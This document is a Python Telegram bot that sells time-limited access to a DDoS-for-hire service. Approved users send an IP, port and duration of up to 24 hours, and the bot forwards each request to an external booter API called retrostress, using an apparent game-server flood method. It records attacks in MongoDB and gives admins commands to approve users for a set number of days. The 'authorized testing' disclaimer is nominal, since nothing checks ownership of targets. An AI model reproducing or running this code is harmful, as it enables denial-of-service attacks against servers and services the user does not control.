import asyncio
import logging
import subprocess
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Default attack parameters matching retrostress API
DEFAULT_METHOD = os.getenv("DEFAULT_METHOD", "BGMI")
DEFAULT_CONCURRENT = int(os.getenv("DEFAULT_CONCURRENT", "1"))
CUSTOM_ID = os.getenv("CUSTOM_ID", "Fbnkmjia")
ATTACK_COOLDOWN = int(os.getenv("ATTACK_COOLDOWN", "10"))  # seconds between attacks

# Blocked ports (must match backend)
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# Allowed port range
MIN_PORT = 1
MAX_PORT = 65535

# Track active attacks
active_attacks: Dict[str, dict] = {}

# Helper function to make datetime timezone-aware
def make_aware(dt):
    """Convert naive datetime to timezone-aware UTC datetime"""
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    """Get current UTC time with timezone"""
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

# MongoDB Connection
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db['users']
        self.attacks = self.db['attacks']
        self._create_indexes()
    
    def _create_indexes(self):
        self.users.create_index([('user_id', ASCENDING)], unique=True)
        self.users.create_index([('approved', ASCENDING)])
        self.users.create_index([('expires_at', ASCENDING)])
        self.attacks.create_index([('user_id', ASCENDING)])
        self.attacks.create_index([('timestamp', DESCENDING)])
        self.attacks.create_index([('status', ASCENDING)])
    
    def add_user(self, user_id: int, username: str = None):
        existing = self.users.find_one({'user_id': user_id})
        if not existing:
            self.users.insert_one({
                'user_id': user_id,
                'username': username,
                'approved': False,
                'approved_at': None,
                'expires_at': None,
                'total_attacks': 0,
                'created_at': get_current_time(),
                'is_banned': False
            })
            return True
        return False
    
    def approve_user(self, user_id: int, days: int):
        result = self.users.update_one(
            {'user_id': user_id},
            {'$set': {
                'approved': True,
                'approved_at': get_current_time(),
                'expires_at': get_current_time() + timedelta(days=days)
            }}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int):
        result = self.users.update_one(
            {'user_id': user_id},
            {'$set': {
                'approved': False,
                'approved_at': None,
                'expires_at': None
            }}
        )
        return result.modified_count > 0
    
    def get_user(self, user_id: int):
        return self.users.find_one({'user_id': user_id})
    
    def get_all_users(self):
        return list(self.users.find().sort('created_at', DESCENDING))
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, method: str, status: str, attack_id: str = None):
        self.attacks.insert_one({
            'user_id': user_id,
            'ip': ip,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'attack_id': attack_id or str(uuid.uuid4()),
            'timestamp': get_current_time()
        })
        # Increment total attacks count
        if status == 'success':
            self.users.update_one(
                {'user_id': user_id},
                {'$inc': {'total_attacks': 1}}
            )
    
    def get_user_attack_stats(self, user_id: int):
        pipeline = [
            {'$match': {'user_id': user_id}},
            {'$group': {
                '_id': None,
                'total': {'$sum': 1},
                'successful': {'$sum': {'$cond': [{'$eq': ['$status', 'success']}, 1, 0]}},
                'failed': {'$sum': {'$cond': [{'$eq': ['$status', 'failed']}, 1, 0]}}
            }}
        ]
        stats = list(self.attacks.aggregate(pipeline))
        recent = list(self.attacks.find(
            {'user_id': user_id}
        ).sort('timestamp', DESCENDING).limit(5))
        
        if stats:
            return {
                'total': stats[0]['total'],
                'successful': stats[0]['successful'],
                'failed': stats[0]['failed'],
                'recent': recent
            }
        return {'total': 0, 'successful': 0, 'failed': 0, 'recent': []}
    
    def get_global_stats(self):
        pipeline = [
            {'$group': {
                '_id': None,
                'total': {'$sum': 1},
                'successful': {'$sum': {'$cond': [{'$eq': ['$status', 'success']}, 1, 0]}},
                'failed': {'$sum': {'$cond': [{'$eq': ['$status', 'failed']}, 1, 0]}}
            }}
        ]
        stats = list(self.attacks.aggregate(pipeline))
        total_users = self.users.count_documents({})
        approved_users = self.users.count_documents({'approved': True})
        
        if stats:
            return {
                'total_attacks': stats[0]['total'],
                'successful': stats[0]['successful'],
                'failed': stats[0]['failed'],
                'total_users': total_users,
                'approved_users': approved_users
            }
        return {
            'total_attacks': 0, 'successful': 0, 'failed': 0,
            'total_users': total_users, 'approved_users': approved_users
        }
    
    def get_running_attacks(self):
        now = get_current_time()
        five_min_ago = now - timedelta(minutes=5)
        return list(self.attacks.find({
            'timestamp': {'$gte': five_min_ago},
            'status': 'success'
        }).sort('timestamp', DESCENDING).limit(20))

# Initialize database
db = Database()

def is_valid_ip(ip: str) -> bool:
    """Validate IP address format"""
    pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
    match = re.match(pattern, ip)
    if not match:
        return False
    return all(0 <= int(part) <= 255 for part in match.groups())

def is_valid_port(port: int) -> bool:
    """Validate port number"""
    return MIN_PORT <= port <= MAX_PORT

def get_blocked_ports_list() -> str:
    """Get formatted blocked ports list"""
    blocked_list = sorted(BLOCKED_PORTS)
    return ', '.join(str(p) for p in blocked_list)

async def is_user_approved(user_id: int) -> bool:
    """Check if user is approved and not expired"""
    user = db.get_user(user_id)
    if not user:
        return False
    if not user.get('approved'):
        return False
    if user.get('is_banned'):
        return False
    expires_at = user.get('expires_at')
    if expires_at:
        expires_at = make_aware(expires_at)
        if get_current_time() > expires_at:
            # Auto-expire user
            db.disapprove_user(user_id)
            return False
    return True

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMIN_IDS

def admin_only(func):
    """Decorator for admin-only commands"""
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not is_admin(user_id):
            await update.message.reply_text("❌ You are not authorized to use this command.")
            return
        return await func(update, context)
    return wrapper

def get_active_attack_key(user_id: int, target: str, port: int) -> str:
    """Generate unique key for an active attack"""
    return f"{user_id}:{target}:{port}"

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user = update.effective_user
    db.add_user(user.id, user.username)
    
    welcome_message = (
        f"🚀 Welcome {user.first_name}!\n\n"
        f"This bot interfaces with an external stress-testing API.\n\n"
        f"📋 Commands:\n"
        f"🔹 /help - Show all commands\n"
        f"🔹 /attack <ip> <port> <duration> - Launch attack\n"
        f"🔹 /myattacks - Check your active attacks\n"
        f"🔹 /myinfo - View your account info\n"
        f"🔹 /mystats - View your attack statistics\n"
        f"🔹 /blockedports - Show blocked ports\n\n"
        f"👑 Admin commands available for authorized users.\n\n"
        f"⚙️ Default method: {DEFAULT_METHOD} | Concurrent: {DEFAULT_CONCURRENT}"
    )
    
    await update.message.reply_text(welcome_message)

# ============================================================
# MODIFIED ATTACK COMMAND - RETROSTRESS API FORMAT
# ============================================================
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Launch an attack via retrostress.net API"""
    user_id = update.effective_user.id
    
    # Check if user is approved
    if not await is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You are not approved to use this bot.\n"
            "Contact administrator for access."
        )
        return
    
    # Parse arguments
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ Usage: /attack <ip> <port> <duration>\n\n"
            "Example:\n"
            "/attack 192.168.1.1 80 300\n"
            "/attack 10.0.0.5 443 600\n\n"
            f"⏱ Duration in seconds | Allowed ports: {MIN_PORT}-{MAX_PORT}\n"
            f"🚫 Blocked ports: {get_blocked_ports_list()}\n"
            f"⚙️ Method: {DEFAULT_METHOD} | Concurrent: {DEFAULT_CONCURRENT}"
        )
        return
    
    target_ip = args[0]
    try:
        target_port = int(args[1])
        duration = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be valid numbers.")
        return
    
    # Validate IP
    if not is_valid_ip(target_ip):
        await update.message.reply_text("❌ Invalid IP address format. Use X.X.X.X (0-255).")
        return
    
    # Validate port
    if not is_valid_port(target_port):
        await update.message.reply_text(f"❌ Port must be between {MIN_PORT} and {MAX_PORT}.")
        return
    
    if target_port in BLOCKED_PORTS:
        await update.message.reply_text(
            f"❌ Port {target_port} is blocked and cannot be used.\n"
            f"Blocked ports: {get_blocked_ports_list()}"
        )
        return
    
    # Validate duration
    if duration < 30:
        await update.message.reply_text("❌ Minimum duration is 30 seconds.")
        return
    if duration > 86400:  # 24 hours max
        await update.message.reply_text("❌ Maximum duration is 86400 seconds (24 hours).")
        return
    
    # Check cooldown
    attack_key = get_active_attack_key(user_id, target_ip, target_port)
    if attack_key in active_attacks:
        last_time = active_attacks[attack_key]['time']
        elapsed = (get_current_time() - last_time).seconds
        if elapsed < ATTACK_COOLDOWN:
            remaining = ATTACK_COOLDOWN - elapsed
            await update.message.reply_text(
                f"⏳ Please wait {remaining} seconds before attacking the same target."
            )
            return
    
    # Send initial confirmation
    status_msg = await update.message.reply_text(
        f"🚀 Launching attack...\n\n"
        f"🎯 Target: {target_ip}:{target_port}\n"
        f"⏱ Duration: {duration}s\n"
        f"⚙️ Method: {DEFAULT_METHOD}\n"
        f"🔀 Concurrent: {DEFAULT_CONCURRENT}"
    )
    
    # Build the retrostress API payload - EXACT format as your curl
    payload = {
        "target": target_ip,
        "port": target_port,
        "duration": duration,
        "method": DEFAULT_METHOD,
        "concurrent": DEFAULT_CONCURRENT,
        "customId": CUSTOM_ID
    }
    
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }
    
    try:
        # Call retrostress API
        response = requests.post(
            API_URL,
            headers=headers,
            json=payload,
            timeout=30
        )
        
        # Log the attack
        attack_id = str(uuid.uuid4())
        
        if response.status_code == 200 or response.status_code == 201:
            status = "success"
            
            # Try to parse response
            try:
                resp_data = response.json()
                resp_text = f"✅ Attack Launched Successfully!\n\n"
                resp_text += f"📋 Response: `{json.dumps(resp_data, indent=2)}`"
            except:
                resp_text = f"✅ Attack Launched Successfully!\n\n"
                resp_text += f"📋 Status: {response.status_code}"
            
            resp_text += f"\n\n🎯 Target: {target_ip}:{target_port}"
            resp_text += f"\n⏱ Duration: {duration}s"
            resp_text += f"\n⚙️ Method: {DEFAULT_METHOD}"
            resp_text += f"\n🆔 Attack ID: {attack_id[:8]}..."
            
            # Mark active
            active_attacks[attack_key] = {
                'time': get_current_time(),
                'attack_id': attack_id
            }
            
            await status_msg.edit_text(resp_text)
            
        else:
            status = "failed"
            error_body = response.text[:500] if response.text else "No response body"
            await status_msg.edit_text(
                f"❌ Attack Failed\n\n"
                f"📋 HTTP {response.status_code}\n"
                f"📄 Response: {error_body}\n\n"
                f"Check API URL, key, or target."
            )
        
        # Log to database
        db.log_attack(
            user_id=user_id,
            ip=target_ip,
            port=target_port,
            duration=duration,
            method=DEFAULT_METHOD,
            status=status,
            attack_id=attack_id
        )
        
    except requests.exceptions.Timeout:
        await status_msg.edit_text("❌ API request timed out. Server may be down.")
        db.log_attack(user_id, target_ip, target_port, duration, DEFAULT_METHOD, "failed")
    
    except requests.exceptions.ConnectionError:
        await status_msg.edit_text("❌ Could not connect to API server. Check API_URL.")
        db.log_attack(user_id, target_ip, target_port, duration, DEFAULT_METHOD, "failed")
    
    except Exception as e:
        logger.error(f"Attack command error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)[:200]}")
        db.log_attack(user_id, target_ip, target_port, duration, DEFAULT_METHOD, "failed")

# ============================================================
# REST OF THE COMMANDS (admin, user info, stats, etc.)
# ============================================================

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's active/running attacks"""
    user_id = update.effective_user.id
    
    user_attacks = []
    for key, data in active_attacks.items():
        if key.startswith(f"{user_id}:"):
            parts = key.split(":")
            target = f"{parts[1]}:{parts[2]}"
            elapsed = (get_current_time() - data['time']).seconds
            user_attacks.append(f"🎯 {target} - {elapsed}s ago")
    
    if user_attacks:
        await update.message.reply_text(
            "🔄 Your Active Attacks:\n\n" + "\n".join(user_attacks)
        )
    else:
        await update.message.reply_text("📭 No active attacks.")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's account information"""
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    if not user:
        await update.message.reply_text("❌ User not found. Use /start to register.")
        return
    
    if user.get('approved'):
        expires_at = make_aware(user.get('expires_at'))
        if expires_at:
            remaining = expires_at - get_current_time()
            if remaining.total_seconds() > 0:
                expires_str = f"{remaining.days}d {remaining.seconds // 3600}h"
            else:
                expires_str = "Expired"
        else:
            expires_str = "Never"
        
        approved_at_str = user.get('approved_at').strftime('%Y-%m-%d') if user.get('approved_at') else 'N/A'
        created_at_str = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'
        
        message = (
            f"📋 Your Account Information\n\n"
            f"🆔 User ID: {user['user_id']}\n"
            f"👤 Username: @{user.get('username', 'N/A')}\n"
            f"✅ Status: Approved\n"
            f"📅 Approved On: {approved_at_str}\n"
            f"⏰ Expires In: {expires_str}\n"
            f"📊 Total Attacks: {user.get('total_attacks', 0)}\n"
            f"📅 Member Since: {created_at_str}"
        )
    else:
        created_at_str = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'
        message = (
            f"❌ Account Not Approved\n\n"
            f"🆔 User ID: {user['user_id']}\n"
            f"👤 Username: @{user.get('username', 'N/A')}\n"
            f"📅 Member Since: {created_at_str}\n\n"
            f"Please contact the administrator to get access."
        )
    
    await update.message.reply_text(message)

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's attack statistics"""
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    
    stats = db.get_user_attack_stats(user_id)
    success_rate = (stats['successful']/stats['total']*100 if stats['total'] > 0 else 0)
    
    message = (
        f"📊 Your Attack Statistics\n\n"
        f"🎯 Total Attacks: {stats['total']}\n"
        f"✅ Successful: {stats['successful']}\n"
        f"❌ Failed: {stats['failed']}\n"
        f"📈 Success Rate: {success_rate:.1f}%\n\n"
    )
    
    if stats['recent']:
        message += "🕐 Recent Attacks:\n"
        for attack in stats['recent'][:5]:
            status_icon = "✅" if attack['status'] == "success" else "❌"
            if attack.get('timestamp'):
                timestamp = make_aware(attack['timestamp'])
                time_ago = (get_current_time() - timestamp).seconds // 60
                message += (
                    f"{status_icon} {attack['ip']}:{attack['port']} - "
                    f"{attack['duration']}s - {time_ago}m ago\n"
                )
    
    await update.message.reply_text(message)

async def blocked_ports_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show blocked ports for users"""
    blocked_ports_str = get_blocked_ports_list()
    message = (
        f"🚫 Blocked Ports\n\n"
        f"The following ports are blocked and cannot be used for attacks:\n\n"
        f"{blocked_ports_str}\n\n"
        f"📊 Total blocked: {len(BLOCKED_PORTS)} ports\n\n"
        f"✅ Allowed ports: All ports from {MIN_PORT} to {MAX_PORT} except the blocked ones.\n\n"
        f"💡 Tip: Use common ports like 80, 8080, 25565, etc."
    )
    await update.message.reply_text(message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help menu"""
    user_id = update.effective_user.id
    is_admin_flag = user_id in ADMIN_IDS
    is_approved = await is_user_approved(user_id)
    
    message = "🤖 Bot Commands\n\n"
    message += "📱 User Commands:\n"
    message += "🔹 /start - Start the bot\n"
    message += "🔹 /help - Show this help menu\n"
    if is_approved:
        message += "🔹 /attack <ip> <port> <duration> - Launch an attack\n"
        message += "🔹 /myattacks - Check your active attacks\n"
        message += "🔹 /myinfo - View your account info\n"
        message += "🔹 /mystats - View your attack statistics\n"
        message += "🔹 /blockedports - Show blocked ports\n"
    
    if is_admin_flag:
        message += "\n👑 Admin Commands:\n"
        message += "🔹 /approve <userid> <days> - Approve a user\n"
        message += "🔹 /disapprove <userid> - Disapprove a user\n"
        message += "🔹 /users - List all users\n"
        message += "🔹 /status - Check API health\n"
        message += "🔹 /running - Check running attacks\n"
        message += "🔹 /stats - View bot statistics\n"
        message += "🔹 /blockedports - Show blocked ports (admin)\n"
    
    message += f"\n⚙️ Default Method: {DEFAULT_METHOD} | Concurrent: {DEFAULT_CONCURRENT}"
    message += f"\n⚠️ For authorized testing only."
    
    await update.message.reply_text(message)

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve a user - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ user_id and days must be numbers.")
        return
    
    if db.approve_user(target_id, days):
        await update.message.reply_text(f"✅ User {target_id} approved for {days} days.")
    else:
        await update.message.reply_text(f"❌ User {target_id} not found.")

async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disapprove a user - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /disapprove <user_id>")
        return
    
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ user_id must be a number.")
        return
    
    if db.disapprove_user(target_id):
        await update.message.reply_text(f"✅ User {target_id} disapproved.")
    else:
        await update.message.reply_text(f"❌ User {target_id} not found.")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("📭 No users found.")
        return
    
    message = "👥 All Users:\n\n"
    for user in users:
        status = "✅" if user.get('approved') else "❌"
        ban_status = "🚫" if user.get('is_banned') else ""
        username = user.get('username', 'N/A') or 'N/A'
        created = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'
        message += f"{status}{ban_status} ID: {user['user_id']} | @{username} | {created}\n"
    
    if len(message) > 4000:
        message = message[:4000] + "\n\n... (truncated)"
    
    await update.message.reply_text(message)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check API health - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    await update.message.reply_text("🔍 Checking API status...")
    
    try:
        # Minimal request to check if API is reachable
        headers = {
            "Authorization": f"Bearer {API_KEY}",
            "Content-Type": "application/json"
        }
        # Just send a GET to the base URL or a minimal health check
        base_url = API_URL.rstrip('/tests').rstrip('/')
        resp = requests.get(f"{base_url}/", headers=headers, timeout=15)
        
        await update.message.reply_text(
            f"✅ API Status: Online\n"
            f"📋 HTTP {resp.status_code}\n"
            f"🌐 URL: {API_URL}\n"
            f"🔑 Key: {API_KEY[:10]}...\n"
            f"⚙️ Method: {DEFAULT_METHOD}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ API Error: {str(e)[:200]}")

async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show running attacks - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    recent = db.get_running_attacks()
    if not recent:
        await update.message.reply_text("📭 No recent attacks.")
        return
    
    message = "🔄 Recent Attacks:\n\n"
    for attack in recent[:10]:
        timestamp = make_aware(attack.get('timestamp'))
        time_ago = (get_current_time() - timestamp).seconds // 60 if timestamp else 0
        message += (
            f"🎯 {attack['ip']}:{attack['port']} | "
            f"⏱ {attack['duration']}s | "
            f"🕐 {time_ago}m ago\n"
        )
    
    await update.message.reply_text(message)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Global bot statistics - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    stats = db.get_global_stats()
    message = (
        f"📊 Bot Statistics\n\n"
        f"👥 Total Users: {stats['total_users']}\n"
        f"✅ Approved Users: {stats['approved_users']}\n"
        f"🎯 Total Attacks: {stats['total_attacks']}\n"
        f"✅ Successful: {stats['successful']}\n"
        f"❌ Failed: {stats['failed']}\n"
        f"🔄 Active Attacks: {len(active_attacks)}\n"
        f"⚙️ Method: {DEFAULT_METHOD} | Concurrent: {DEFAULT_CONCURRENT}"
    )
    
    await update.message.reply_text(message)

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show blocked ports - Admin only"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    await blocked_ports_user_command(update, context)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "❌ An error occurred. Please try again later or contact administrator."
        )

def main():
    """Main function to run the bot"""
    import json  # for response formatting
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    try:
        ip = requests.get('https://ifconfig.me', timeout=5).text.strip()
    except Exception:
        ip = "Unknown"
    
    # Admin commands
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("disapprove", disapprove_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
    
    # User commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    # Start bot
    print("🤖 Bot is starting...")
    print(f"Server IP: {ip}")
    print(f"📊 MongoDB: Connected and indexes optimized.")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 API URL: {API_URL}")
    print(f"🔑 API Key: {API_KEY[:10]}...")
    print(f"⚙️ Method: {DEFAULT_METHOD} | Concurrent: {DEFAULT_CONCURRENT}")
    print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
    print("✅ Bot is running!")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
